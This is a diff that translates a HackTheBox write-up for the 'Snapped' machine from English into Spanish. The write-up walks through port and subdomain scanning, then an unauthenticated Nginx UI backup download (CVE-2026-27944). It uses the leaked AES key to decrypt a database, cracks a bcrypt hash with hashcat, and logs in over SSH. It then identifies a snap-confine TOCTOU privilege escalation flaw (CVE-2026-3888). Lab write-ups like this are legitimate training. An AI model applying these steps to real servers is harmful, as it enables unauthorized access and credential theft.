@@ -1,13 +1,13 @@
 ---
 created: 2026-6-22
-description: Snapped is a hard Linux box running Nginx UI, vulnerable to CVE-2026-27944, which allows unauthenticated backup downloads. The backup exposes an AES-256 encryption key and IV, allowing the database to be decrypted and a bcrypt password hash cracked to gain SSH access as jonathan. Privilege escalation involves exploiting a TOCTOU race condition in snap-confine and systemd-tmpfiles (CVE-2026-3888).
+description: Snapped es una máquina Linux difícil que ejecuta Nginx UI, vulnerable a CVE-2026-27944, lo que permite la descarga no autenticada de backups. El backup expone una clave de cifrado AES-256 y un IV, lo que permite descifrar la base de datos y crackear un hash de contraseña bcrypt para obtener acceso SSH como jonathan. La escalada de privilegios implica explotar una condición de carrera TOCTOU en snap-confine y systemd-tmpfiles (CVE-2026-3888).
 ---
 
 #in-progress #hard #linux #web #htb #subdomains #nginx-ui #cve-2026-27944 #backup #decryption #sqlite #bcrypt  #cve-2026-3888 #toctou #race-condition
-# Enumeration
+# Enumeración
 ## Nmap
 
-Open ports: 22,80
+Puertos abiertos: 22,80
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/scan
 ❯ nmap -p 22,80 -sCV -oN portscan.txt 10.129.21.165
@@ -16,7 +16,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
 ```
 
-## Subdomains
+## Subdominios
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/scan
@@ -24,19 +24,19 @@ PORT   STATE SERVICE VERSION
 admin.snapped.htb            [Status: 200, Size: 950]
 ```
 
-Add the `admin.snapped.htb` subdomain to `/etc/hosts`.
+Añadir el subdominio `admin.snapped.htb` a `/etc/hosts`.
 ```bash
 echo "10.129.21.165 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts
 ```
 
-# Exploitation
+# Explotación
 
-## Backup download
+## Descarga del backup
 
-`admin.snapped.htb` runs **Nigx Ui**, which is vulnerable to backup download ([CVE-2026-27944](https://github.com/advisories/GHSA-g9w5-qffc-6762)).
+`admin.snapped.htb` ejecuta **Nginx Ui**, que es vulnerable a la descarga de backups ([CVE-2026-27944](https://github.com/advisories/GHSA-g9w5-qffc-6762)).
 
-Download `backup.zip` from `admin.snapped.htb/api/backup`.
-Backup.zip is encrypted, but the API sends the **AES-256** key via the `X-Backup-Security` header, **base64**-encoded and formatted as `key:iv` .
+Descargar `backup.zip` desde `admin.snapped.htb/api/backup`.
+Backup.zip está cifrado, pero la API envía la clave **AES-256** a través de la cabecera `X-Backup-Security`, codificada en **base64** y con el formato `key:iv`.
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
@@ -44,17 +44,17 @@ Backup.zip is encrypted, but the API sends the **AES-256** key via the `X-Backup
 ```
 
 >[!Note]
->With this command headers are stored in `headers.txt` and the backup is downloaded as `backup.zip`
+>Con este comando las cabeceras se almacenan en `headers.txt` y el backup se descarga como `backup.zip`
 
-## Backup decryption
+## Descifrado del backup
 
-Unzip the backup.
+Descomprimir el backup.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ unzip backup.zip
 ```
 
-Export the decoded `key` and `iv` as environment variables.
+Exportar la `key` y el `iv` decodificados como variables de entorno.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ export key=$(echo base64-ecoded_key | base64 -d | xxd -p -c 256)
@@ -64,18 +64,18 @@ Export the decoded `key` and `iv` as environment variables.
 ```
 
 >[!note]
->Key and iv are found in `headers.txt`:
+>La key y el iv se encuentran en `headers.txt`:
 >`X-Backup-Security: <base64-encoded_key>:<base64-encoded_iv>`
 
-Decrypt the files in `backup.zip`.
+Descifrar los archivos de `backup.zip`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ openssl enc -d -aes-256-cbc -in ngix-ui.zip -out ngix-ui_dec.zip -K "$key" -iv "$iv"
 ```
 
-## Database enumeration
+## Enumeración de la base de datos
 
-`ngix-ui.zip` contains `database.db` which is a **sqlite** database.
+`ngix-ui.zip` contiene `database.db`, que es una base de datos **sqlite**.
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/c/ngix-ui
@@ -92,25 +92,25 @@ sqlite> select id,name,password from users;
 2|jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
 ```
 
-It contains usernames and their hashes in **bcrypt**. We can put it into a file to crack it with `hashcat`.
+Contiene nombres de usuario y sus hashes en **bcrypt**. Podemos volcarlos a un archivo para crackearlos con `hashcat`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
 $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
 ```
 
-Connect to the user `jonathan` via ssh.
+Conectarse al usuario `jonathan` mediante ssh.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ ssh jonathan@snapped.htb
 jonathan@snapped:~$ cat user.txt 
 ```
 
-# Privilege escalation
+# Escalada de privilegios
 
-## Enumeration
+## Enumeración
 
- The snap version is vulnerable to a TOCTOU race condition between `snap-confine` and `systemd-tmpfiles`. ([CVE-2026-3888](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE))
+ La versión de snap es vulnerable a una condición de carrera TOCTOU entre `snap-confine` y `systemd-tmpfiles`. ([CVE-2026-3888](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE))
 
 ```bash
 jonathan@snapped:/$ snap --version
@@ -118,6 +118,6 @@ snap    2.63.1+24.04
 snapd   2.63.1+24.04
 ```
 
->[!Note] TOCTOU race condition
->"Time Of Check to Time Of Use." It is a concurrency bug that happens when a program checks a condition about a resource and the program uses it after a short delay assuming nothing changed.
-
+>[!Note] Condición de carrera TOCTOU
+>"Time Of Check to Time Of Use." Es un fallo de concurrencia que ocurre cuando un programa comprueba una condición sobre un recurso y lo utiliza después de un breve intervalo asumiendo que nada ha cambiado.
+```
